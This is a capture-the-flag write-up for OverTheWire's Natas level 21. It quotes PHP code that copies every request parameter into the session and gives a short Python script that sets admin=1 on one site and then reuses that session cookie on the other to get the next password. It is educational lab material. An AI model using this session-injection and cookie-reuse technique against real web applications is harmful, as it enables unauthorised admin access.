# Natas 21 -> 22

```
http://natas21.natas.labs.overthewire.org
http://natas21-experimenter.natas.labs.overthewire.org
```

```
Username: natas21
```

This time we get two sites and their codes

`natas21`
```php
function print_credentials() { /* {{{ */ 
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) { 
    print "You are an admin. The credentials for the next level are:<br>"; 
    print "<pre>Username: natas22\n"; 
    print "Password: <censored></pre>"; 
    } else { 
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22."; 
    } 
} 
/* }}} */ 

session_start(); 
print_credentials(); 
```

`natas21-experimenter`
```php
session_start(); 

// if update was submitted, store it 
if(array_key_exists("submit", $_REQUEST)) { 
    foreach($_REQUEST as $key => $val) { 
    $_SESSION[$key] = $val; 
    } 
} 

if(array_key_exists("debug", $_GET)) { 
    print "[DEBUG] Session contents:<br>"; 
    print_r($_SESSION); 
} 

// only allow these keys 
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow"); 
$form = ""; 

$form .= '<form action="index.php" method="POST">'; 
foreach($validkeys as $key => $defval) { 
    $val = $defval; 
    if(array_key_exists($key, $_SESSION)) { 
    $val = $_SESSION[$key]; 
    } else { 
    $_SESSION[$key] = $val; 
    } 
    $form .= "$key: <input name='$key' value='$val' /><br>"; 
} 
$form .= '<input type="submit" name="submit" value="Update" />'; 
$form .= '</form>'; 

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";"; 
$example = "<div style='$style'>Hello world!</div>"; 

?> 

<p>Example:</p> 
<?=$example?> 

<p>Change example values here:</p> 
<?=$form?> 
```

`natas21` only prints the credentials for the next level. `natas21-experimenter` is the one we need to work with.  
Basically, it'll take all the keys from `$validkeys` and print a `<form>` but before that it'll search for `submit` in `$_REQUEST`, if there's such key then all the content we pass will be added to `$_SESSION` therefore authenticating us as admin.  
The only trick here is that we will be logged as admin in `natas21-experimenter` and not in `natas21` but since both sites work together we need to pass the cookie from `natas21-experimenter` in `natas21`.

```python
#!/usr/bin/env python

import requests

url = "http://natas21.natas.labs.overthewire.org/"
url_experimenter = "http://natas21-experimenter.natas.labs.overthewire.org/"
http_user = "natas21"
http_pass = ""

rexp = requests.get(url_experimenter,
                    params={
                        "admin": "1",
                        "submit": "1"
                    },
                    auth=(http_user, http_pass))

r = requests.get(url,
                 cookies={'PHPSESSID': rexp.cookies.get('PHPSESSID')},
                 auth=(http_user, http_pass))

print r.text
```


* php
